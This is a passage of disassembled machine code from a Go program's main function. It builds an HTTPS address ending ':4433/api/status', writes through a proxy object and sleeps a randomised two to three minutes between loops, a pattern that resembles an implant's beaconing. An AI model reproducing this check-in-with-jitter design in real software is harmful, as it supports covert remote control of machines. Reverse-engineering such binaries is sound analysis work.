   14027862a:	00 01 00 00 00 
   14027862f:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x1
   140278636:	00 01 00 00 00 
   14027863b:	48 8d 94 24 e8 00 00 	lea    rdx,[rsp+0xe8]
   140278642:	00 
   140278643:	48 89 94 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rdx
   14027864a:	00 
   14027864b:	48 8b 05 26 73 39 00 	mov    rax,QWORD PTR [rip+0x397326]        # 0x14060f978 '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   140278652:	31 db                	xor    ebx,ebx
   140278654:	b9 02 00 00 00       	mov    ecx,0x2
   140278659:	48 8d bc 24 08 01 00 	lea    rdi,[rsp+0x108]
   140278660:	00 
   140278661:	e8 9a af e9 ff       	call   0x140113600 <log.(*Logger).output>
   140278666:	e9 aa fd ff ff       	jmp    0x140278415
   14027866b:	31 c0                	xor    eax,eax
   14027866d:	48 8d 1d 02 d0 0e 00 	lea    rbx,[rip+0xed002]        # 0x140365676 'https://omitzeronetedns0[::1]:53continue_gatewayshutdownwsaioctlinvalid address raw-readsendfileread'
   140278674:	b9 08 00 00 00       	mov    ecx,0x8
   140278679:	48 8b 7c 24 78       	mov    rdi,QWORD PTR [rsp+0x78]
   14027867e:	48 8b 74 24 50       	mov    rsi,QWORD PTR [rsp+0x50]
   140278683:	4c 8d 05 94 fc 0e 00 	lea    r8,[rip+0xefc94]        # 0x14036831e ':4433/api/statuscontext canceled0123456789abcdefafter object keyhostLookupOrder=/etc/resolv.confnon-'
   14027868a:	41 b9 10 00 00 00    	mov    r9d,0x10
   140278690:	e8 ab 19 de ff       	call   0x14005a040 <runtime.concatstring3>
   140278695:	48 89 d9             	mov    rcx,rbx
   140278698:	48 89 c3             	mov    rbx,rax
   14027869b:	48 8b 84 24 90 00 00 	mov    rax,QWORD PTR [rsp+0x90]
   1402786a2:	00 
   1402786a3:	e8 38 e0 ff ff       	call   0x1402766e0 <main.calculate>
   1402786a8:	48 85 db             	test   rbx,rbx
   1402786ab:	0f 84 a6 00 00 00    	je     0x140278757
   1402786b1:	44 0f 11 bc 24 a8 00 	movups XMMWORD PTR [rsp+0xa8],xmm15
   1402786b8:	00 00 
   1402786ba:	44 0f 11 bc 24 b8 00 	movups XMMWORD PTR [rsp+0xb8],xmm15
   1402786c1:	00 00 
   1402786c3:	48 8d 15 b6 cb 07 00 	lea    rdx,[rip+0x7cbb6]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   1402786ca:	48 89 94 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rdx
   1402786d1:	00 
   1402786d2:	48 8d 35 87 b0 16 00 	lea    rsi,[rip+0x16b087]        # 0x1403e3760 '[j6@\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00F;7@\x01\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\x04t7@\x01\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00\\x9fQ7@\x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xe5R6@\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\\xa4\\xab6@\x01\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\t\\x967@'
   1402786d9:	48 89 b4 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rsi
   1402786e0:	00 
   1402786e1:	74 04                	je     0x1402786e7
   1402786e3:	48 8b 5b 08          	mov    rbx,QWORD PTR [rbx+0x8]
   1402786e7:	48 89 9c 24 b8 00 00 	mov    QWORD PTR [rsp+0xb8],rbx
   1402786ee:	00 
   1402786ef:	48 89 8c 24 c0 00 00 	mov    QWORD PTR [rsp+0xc0],rcx
   1402786f6:	00 
   1402786f7:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x0
   1402786fe:	00 00 00 00 00 
   140278703:	48 8d 15 96 01 00 00 	lea    rdx,[rip+0x196]        # 0x1402788a0 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec0H\\x89D$@H\\x8bz\x08H\\x8br\x10L\\x8bB\x18\\x90軯\\xe6\\xffH\\x83\\xc40]\\xc3H\\x89D$\x08H\\x89\\$\x10H\\x89L$\x18\\xe8\\xa1\\xff\\xdf\\xffH\\x8bD$\x08H\\x8b\\$\x10H\\x8bL$\x18\\xeb\\xb0\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.main.Println.func4>
   14027870a:	48 89 94 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rdx
   140278711:	00 
   140278712:	48 c7 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],0x2
   140278719:	00 02 00 00 00 
   14027871e:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x2
   140278725:	00 02 00 00 00 
   14027872a:	48 8d 94 24 a8 00 00 	lea    rdx,[rsp+0xa8]
   140278731:	00 
   140278732:	48 89 94 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rdx
   140278739:	00 
   14027873a:	48 8b 05 37 72 39 00 	mov    rax,QWORD PTR [rip+0x397237]        # 0x14060f978 '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   140278741:	31 db                	xor    ebx,ebx
   140278743:	b9 02 00 00 00       	mov    ecx,0x2
   140278748:	48 8d bc 24 08 01 00 	lea    rdi,[rsp+0x108]
   14027874f:	00 
   140278750:	e8 ab ae e9 ff       	call   0x140113600 <log.(*Logger).output>
   140278755:	eb 06                	jmp    0x14027875d
   140278757:	48 83 f8 01          	cmp    rax,0x1
   14027875b:	74 34                	je     0x140278791
   14027875d:	48 8b 05 0c 7d 38 00 	mov    rax,QWORD PTR [rip+0x387d0c]        # 0x140600470 '\\x80\x0b`@\x01\x00\x00\x00\\x80\ra@\x01\x00\x00\x00\\x80v`@\x01\x00\x00\x00\\xc0v`@\x01\x00\x00\x00\x00w`@\x01\x00\x00\x00\\x88N8@\x01\x00\x00\x00xO8@\x01\x00\x00\x00xO8@\x01\x00\x00\x00xO8@\x01\x00\x00\x00xO8@\x01\x00\x00\x00xO8@\x01\x00\x00\x00xO8@\x01\x00\x00\x00P\\xff`@'
   140278764:	bb 1f 00 00 00       	mov    ebx,0x1f
   140278769:	e8 12 47 ed ff       	call   0x14014ce80 <math/rand/v2.(*Rand).uint64n>
   14027876e:	48 8d 48 f1          	lea    rcx,[rax-0xf]
   140278772:	48 69 c9 00 ca 9a 3b 	imul   rcx,rcx,0x3b9aca00
   140278779:	48 ba 00 08 d6 e8 29 	movabs rdx,0x29e8d60800
   140278780:	00 00 00 
   140278783:	48 8d 04 0a          	lea    rax,[rdx+rcx*1]
   140278787:	e8 54 e1 df ff       	call   0x1400768e0 <time.Sleep>
   14027878c:	e9 84 fc ff ff       	jmp    0x140278415
   140278791:	48 8b 84 24 80 00 00 	mov    rax,QWORD PTR [rsp+0x80]
   140278798:	00 
   140278799:	bb 01 00 00 00       	mov    ebx,0x1
   14027879e:	66 90                	xchg   ax,ax
   1402787a0:	e8 5b c7 ff ff       	call   0x140274f00 <main.(*Proxy).Write>
   1402787a5:	48 85 c0             	test   rax,rax
   1402787a8:	0f 84 67 fc ff ff    	je     0x140278415
   1402787ae:	44 0f 11 bc 24 98 00 	movups XMMWORD PTR [rsp+0x98],xmm15
   1402787b5:	00 00 
   1402787b7:	74 04                	je     0x1402787bd
   1402787b9:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
   1402787bd:	48 89 84 24 98 00 00 	mov    QWORD PTR [rsp+0x98],rax
   1402787c4:	00 
   1402787c5:	48 89 9c 24 a0 00 00 	mov    QWORD PTR [rsp+0xa0],rbx
   1402787cc:	00 
   1402787cd:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x0
   1402787d4:	00 00 00 00 00 
   1402787d9:	48 8d 15 60 00 00 00 	lea    rdx,[rip+0x60]        # 0x140278840 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec0H\\x89D$@H\\x8bz\x08H\\x8br\x10L\\x8bB\x18\\x90\\xe8\x1b\\xb0\\xe6\\xffH\\x83\\xc40]\\xc3H\\x89D$\x08H\\x89\\$\x10H\\x89L$\x18\\xe8\x01\x00\\xe0\\xffH\\x8bD$\x08H\\x8b\\$\x10H\\x8bL$\x18\\xeb\\xb0\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.main.Println.func5>
   1402787e0:	48 89 94 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rdx
   1402787e7:	00 
   1402787e8:	48 c7 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],0x1
   1402787ef:	00 01 00 00 00 
   1402787f4:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x1
   1402787fb:	00 01 00 00 00 
   140278800:	48 8d 94 24 98 00 00 	lea    rdx,[rsp+0x98]
   140278807:	00 
   140278808:	48 89 94 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rdx
   14027880f:	00 
   140278810:	48 8b 05 61 71 39 00 	mov    rax,QWORD PTR [rip+0x397161]        # 0x14060f978 '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   140278817:	31 db                	xor    ebx,ebx
   140278819:	b9 02 00 00 00       	mov    ecx,0x2
   14027881e:	48 8d bc 24 08 01 00 	lea    rdi,[rsp+0x108]
   140278825:	00 
   140278826:	e8 d5 ad e9 ff       	call   0x140113600 <log.(*Logger).output>
   14027882b:	e9 e5 fb ff ff       	jmp    0x140278415
   140278830:	e8 eb 00 e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   140278835:	e9 46 f9 ff ff       	jmp    0x140278180 <main.main>
   14027883a:	cc                   	int3
   14027883b:	cc                   	int3
   14027883c:	cc                   	int3
   14027883d:	cc                   	int3
   14027883e:	cc                   	int3
   14027883f:	cc                   	int3
